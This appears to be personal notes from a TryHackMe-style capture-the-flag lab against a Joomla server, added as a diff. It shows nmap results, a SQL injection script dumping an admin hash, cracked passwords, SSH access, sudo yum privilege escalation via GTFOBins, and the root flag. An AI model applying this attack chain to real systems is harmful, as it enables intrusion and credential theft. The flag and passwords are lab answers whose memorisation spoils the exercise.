@@ -1,0 +1,61 @@
+ip address: 10.10.197.69
+
+
+nmap results:
+
+PORT      STATE    SERVICE REASON      VERSION
+22/tcp    open     ssh     syn-ack     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
+|   256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
+80/tcp    open     http    syn-ack     Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
+|_http-generator: Joomla! - Open Source Content Management
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+3306/tcp  open     mysql   syn-ack     MariaDB (unauthorized)
+19101/tcp filtered unknown no-response
+
+
+ python joomblah.py http://10.10.197.69
+Found table: fb9j5_users
+  -  Extracting users from fb9j5_users
+ [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+  -  Extracting sessions from fb9j5_session
+
+
+username : jonah, passwd: spiderman123 
+
+jjameson password :nv5uz9r3ZEDzVjNu
+
+log in via ssh to jjameson
+
+check privileges of jjameson: sudo -l
+
+ssh jjameson@10.10.233.69
+jjameson@10.10.233.69's password: 
+Last login: Sun Jun 14 12:07:53 2020
+[jjameson@dailybugle ~]$ sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
+    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+
+use https://gtfobins.github.io/gtfobins/yum/ to escalete to root 
+
+root flag: eec3d53292b1821868266858d7fa6f79
